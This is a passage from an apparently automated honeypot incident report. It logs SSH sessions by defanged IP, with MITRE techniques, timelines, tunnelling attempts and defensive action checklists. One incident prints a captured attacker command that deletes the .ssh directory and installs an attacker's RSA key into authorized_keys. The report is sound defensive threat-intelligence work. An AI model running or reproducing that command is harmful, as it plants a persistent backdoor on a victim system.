| `2026-07-23 18:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.6[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.17.6[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d8ef3bb51fd

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-23 18:18 |
| **Last Seen** | 2026-07-23 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:18:25` | `cowrie.session.connect` |
| `2026-07-23 18:18:25` | `cowrie.client.version` |
| `2026-07-23 18:18:26` | `cowrie.client.kex` |
| `2026-07-23 18:18:26` | `cowrie.login.success` |
| `2026-07-23 18:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944bdbf1b77c

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-23 18:18 |
| **Last Seen** | 2026-07-23 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:18:26` | `cowrie.session.connect` |
| `2026-07-23 18:18:26` | `cowrie.client.version` |
| `2026-07-23 18:18:26` | `cowrie.client.kex` |
| `2026-07-23 18:18:27` | `cowrie.login.success` |
| `2026-07-23 18:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42f801d6b7b5

| Field | Detail |
|---|---|
| **Source IP** | `218.59.235[.]170` |
| **First Seen** | 2026-07-23 18:23 |
| **Last Seen** | 2026-07-23 18:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:23:24` | `cowrie.session.connect` |
| `2026-07-23 18:23:25` | `cowrie.client.version` |
| `2026-07-23 18:23:25` | `cowrie.client.kex` |
| `2026-07-23 18:23:27` | `cowrie.login.success` |
| `2026-07-23 18:23:27` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.59.235[.]170` to AbuseIPDB if not already reported
- [ ] Block `218.59.235[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c3924ff4bf

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]251` |
| **First Seen** | 2026-07-23 18:23 |
| **Last Seen** | 2026-07-23 18:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:23:37` | `cowrie.session.connect` |
| `2026-07-23 18:23:37` | `cowrie.client.version` |
| `2026-07-23 18:23:37` | `cowrie.client.kex` |
| `2026-07-23 18:23:39` | `cowrie.login.success` |
| `2026-07-23 18:23:40` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]251` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ad6a0e9cab

| Field | Detail |
|---|---|
| **Source IP** | `111.42.132[.]19` |
| **First Seen** | 2026-07-23 18:24 |
| **Last Seen** | 2026-07-23 18:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:24:17` | `cowrie.session.connect` |
| `2026-07-23 18:24:18` | `cowrie.client.version` |
| `2026-07-23 18:24:18` | `cowrie.client.kex` |
| `2026-07-23 18:24:21` | `cowrie.login.success` |
| `2026-07-23 18:24:21` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:24:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.132[.]19` to AbuseIPDB if not already reported
- [ ] Block `111.42.132[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e93fc77b57

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-23 18:24 |
| **Last Seen** | 2026-07-23 18:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:24:31` | `cowrie.session.connect` |
| `2026-07-23 18:24:32` | `cowrie.client.version` |
| `2026-07-23 18:24:32` | `cowrie.client.kex` |
| `2026-07-23 18:24:34` | `cowrie.login.success` |
| `2026-07-23 18:24:34` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd34808194f5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-23 18:24 |
| **Last Seen** | 2026-07-23 18:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:24:45` | `cowrie.session.connect` |
| `2026-07-23 18:24:46` | `cowrie.client.version` |
| `2026-07-23 18:24:46` | `cowrie.client.kex` |
| `2026-07-23 18:24:47` | `cowrie.login.success` |
| `2026-07-23 18:24:47` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1d826ae734

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-07-23 18:24 |
| **Last Seen** | 2026-07-23 18:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:24:53` | `cowrie.session.connect` |
| `2026-07-23 18:24:53` | `cowrie.client.version` |
| `2026-07-23 18:24:53` | `cowrie.client.kex` |
| `2026-07-23 18:24:55` | `cowrie.login.success` |
| `2026-07-23 18:24:56` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c05a57768660

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-23 18:25 |
| **Last Seen** | 2026-07-23 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:25:57` | `cowrie.session.connect` |
| `2026-07-23 18:25:57` | `cowrie.client.version` |
| `2026-07-23 18:25:57` | `cowrie.client.kex` |
| `2026-07-23 18:25:58` | `cowrie.login.success` |
| `2026-07-23 18:25:59` | `cowrie.session.params` |
| `2026-07-23 18:25:59` | `cowrie.command.input` |
| `2026-07-23 18:25:59` | `cowrie.command.failed` |
| `2026-07-23 18:26:00` | `cowrie.log.closed` |
| `2026-07-23 18:26:01` | `cowrie.session.params` |
| `2026-07-23 18:26:01` | `cowrie.command.input` |
| `2026-07-23 18:26:01` | `cowrie.session.file_download` |
| `2026-07-23 18:26:01` | `cowrie.log.closed` |
| `2026-07-23 18:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b08dd921fa9

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-23 18:26 |
| **Last Seen** | 2026-07-23 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:26:02` | `cowrie.session.connect` |
| `2026-07-23 18:26:02` | `cowrie.client.version` |
| `2026-07-23 18:26:02` | `cowrie.client.kex` |
| `2026-07-23 18:26:03` | `cowrie.login.success` |
| `2026-07-23 18:26:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac5ef2fcab1

| Field | Detail |
|---|---|
| **Source IP** | `35.207.202[.]141` |
| **First Seen** | 2026-07-23 18:26 |
| **Last Seen** | 2026-07-23 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:26:03` | `cowrie.session.connect` |
| `2026-07-23 18:26:03` | `cowrie.client.version` |
| `2026-07-23 18:26:04` | `cowrie.client.kex` |
| `2026-07-23 18:26:05` | `cowrie.login.success` |
| `2026-07-23 18:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.207.202[.]141` to AbuseIPDB if not already reported
- [ ] Block `35.207.202[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56e24e8d26a2

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-07-23 18:27 |
| **Last Seen** | 2026-07-23 18:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:27:37` | `cowrie.session.connect` |
| `2026-07-23 18:27:38` | `cowrie.client.version` |
| `2026-07-23 18:27:38` | `cowrie.client.kex` |
| `2026-07-23 18:27:40` | `cowrie.login.success` |
| `2026-07-23 18:27:40` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:27:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-673a2e1cac01

| Field | Detail |
|---|---|
| **Source IP** | `121.189.226[.]81` |
| **First Seen** | 2026-07-23 18:27 |
| **Last Seen** | 2026-07-23 18:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:27:46` | `cowrie.session.connect` |
| `2026-07-23 18:27:46` | `cowrie.client.version` |
| `2026-07-23 18:27:46` | `cowrie.client.kex` |
| `2026-07-23 18:27:48` | `cowrie.login.success` |
| `2026-07-23 18:27:49` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.189.226[.]81` to AbuseIPDB if not already reported
- [ ] Block `121.189.226[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0868c99a7a54

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]124` |
| **First Seen** | 2026-07-23 18:40 |
| **Last Seen** | 2026-07-23 18:45 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:40:53` | `cowrie.session.connect` |
| `2026-07-23 18:40:53` | `cowrie.client.version` |
| `2026-07-23 18:40:53` | `cowrie.client.kex` |
| `2026-07-23 18:40:54` | `cowrie.login.success` |
| `2026-07-23 18:40:55` | `cowrie.session.params` |
| `2026-07-23 18:40:55` | `cowrie.command.input` |
| `2026-07-23 18:40:55` | `cowrie.command.failed` |
| `2026-07-23 18:40:55` | `cowrie.log.closed` |
| `2026-07-23 18:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]124` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad242ddd96d

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-07-23 18:46 |
| **Last Seen** | 2026-07-23 18:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:46:17` | `cowrie.session.connect` |
| `2026-07-23 18:46:18` | `cowrie.client.version` |
| `2026-07-23 18:46:18` | `cowrie.client.kex` |
| `2026-07-23 18:46:19` | `cowrie.login.success` |
| `2026-07-23 18:46:20` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa92f16d5aa

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-23 18:46 |
| **Last Seen** | 2026-07-23 18:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:46:29` | `cowrie.session.connect` |
| `2026-07-23 18:46:30` | `cowrie.client.version` |
| `2026-07-23 18:46:30` | `cowrie.client.kex` |
| `2026-07-23 18:46:32` | `cowrie.login.success` |
| `2026-07-23 18:46:33` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90c1c327ab74

| Field | Detail |
|---|---|
| **Source IP** | `110.164.201[.]73` |
| **First Seen** | 2026-07-23 18:49 |
| **Last Seen** | 2026-07-23 18:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:49:11` | `cowrie.session.connect` |
| `2026-07-23 18:49:12` | `cowrie.client.version` |
| `2026-07-23 18:49:12` | `cowrie.client.kex` |
| `2026-07-23 18:49:14` | `cowrie.login.success` |
| `2026-07-23 18:49:14` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:49:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.164.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `110.164.201[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9618f45f2fa

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-07-23 18:49 |
| **Last Seen** | 2026-07-23 18:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:49:23` | `cowrie.session.connect` |
| `2026-07-23 18:49:24` | `cowrie.client.version` |
| `2026-07-23 18:49:24` | `cowrie.client.kex` |
| `2026-07-23 18:49:25` | `cowrie.login.success` |
| `2026-07-23 18:49:26` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:49:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c3e10daadc6

| Field | Detail |
|---|---|
| **Source IP** | `116.7.248[.]50` |
| **First Seen** | 2026-07-23 18:49 |
| **Last Seen** | 2026-07-23 18:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:49:24` | `cowrie.session.connect` |
| `2026-07-23 18:49:25` | `cowrie.client.version` |
| `2026-07-23 18:49:25` | `cowrie.client.kex` |
| `2026-07-23 18:49:26` | `cowrie.login.success` |
| `2026-07-23 18:49:27` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.7.248[.]50` to AbuseIPDB if not already reported
- [ ] Block `116.7.248[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43817d2b405c

| Field | Detail |
|---|---|
| **Source IP** | `112.196.52[.]107` |
| **First Seen** | 2026-07-23 18:49 |
| **Last Seen** | 2026-07-23 18:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:49:31` | `cowrie.session.connect` |
| `2026-07-23 18:49:32` | `cowrie.client.version` |
| `2026-07-23 18:49:32` | `cowrie.client.kex` |
| `2026-07-23 18:49:34` | `cowrie.login.success` |
| `2026-07-23 18:49:35` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:49:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.52[.]107` to AbuseIPDB if not already reported
- [ ] Block `112.196.52[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa976b886ddf

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]151` |
| **First Seen** | 2026-07-23 18:52 |
| **Last Seen** | 2026-07-23 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:52:28` | `cowrie.session.connect` |
| `2026-07-23 18:52:29` | `cowrie.client.version` |
| `2026-07-23 18:52:29` | `cowrie.client.kex` |
| `2026-07-23 18:52:30` | `cowrie.login.success` |
| `2026-07-23 18:52:31` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]151` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8abc4e743255

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-07-23 18:52 |
| **Last Seen** | 2026-07-23 18:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 18:52:36` | `cowrie.session.connect` |
| `2026-07-23 18:52:36` | `cowrie.client.version` |
| `2026-07-23 18:52:36` | `cowrie.client.kex` |
| `2026-07-23 18:52:38` | `cowrie.login.success` |
| `2026-07-23 18:52:38` | `cowrie.direct-tcpip.request` |
| `2026-07-23 18:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **5** | 2026-07-23 17:12 | 2026-07-23 18:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-07-23 18:16 | 2026-07-23 18:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-23 17:43 | 2026-07-23 17:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-07-23 18:17 | 2026-07-23 18:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.187[.]62` | **2** | 2026-07-23 17:13 | 2026-07-23 17:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.121.123[.]108` | **2** | 2026-07-23 17:40 | 2026-07-23 17:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | **2** | 2026-07-23 17:19 | 2026-07-23 17:40 | 4m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-07-23 17:13 | 2026-07-23 17:38 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.191.3[.]249` | 1 | 2026-07-23 17:44 | 2026-07-23 17:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.53.195[.]87` | 1 | 2026-07-23 17:51 | 2026-07-23 17:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]232` | 1 | 2026-07-23 17:47 | 2026-07-23 17:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.90[.]3` | 1 | 2026-07-23 17:41 | 2026-07-23 17:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-23 18:03 | 2026-07-23 18:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-07-23 16:59 | 2026-07-23 16:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.3.154[.]183` | 1 | 2026-07-23 18:24 | 2026-07-23 18:24 | 3s | 0 | `T1592` | 🟢 LOW |
| `42.248.129[.]234` | 1 | 2026-07-23 17:10 | 2026-07-23 17:11 | 64s | 0 | `T1592` | 🟢 LOW |
| `50.217.255[.]171` | 1 | 2026-07-23 18:24 | 2026-07-23 18:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]117` | 1 | 2026-07-23 17:46 | 2026-07-23 17:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-07-23 17:19 | 2026-07-23 17:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | 1 | 2026-07-23 17:00 | 2026-07-23 17:00 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
